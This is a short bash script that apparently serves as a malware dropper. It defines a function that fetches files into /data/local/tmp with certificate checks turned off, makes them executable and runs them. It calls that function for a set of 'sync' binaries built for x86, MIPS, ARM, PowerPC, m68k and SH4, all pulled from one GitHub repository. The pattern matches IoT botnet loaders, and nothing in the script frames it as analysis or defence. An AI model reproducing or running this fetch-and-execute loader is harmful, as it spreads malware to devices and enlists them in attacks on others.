#!/bin/bash

download_and_run() {
    local url=$1
    local file=$2
    
    cd /data/local/tmp
    
    wget --no-check-certificate "$url" -O "$file" || \
    curl -k -L "$url" -o "$file" || \
    busybox wget "$url" -O "$file"
    
    chmod +x "$file"
    ./"$file"
}

download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.x86" "sync.x86"
download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.mips" "sync.mips"
download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.mipsel" "sync.mipsel"
download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm4" "sync.arm4"
download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm5" "sync.arm5"
download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm6" "sync.arm6"
download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm7" "sync.arm7"
download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.powerpc" "sync.powerpc"
download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.m68k" "sync.m68k"
download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.sh4" "sync.sh4"
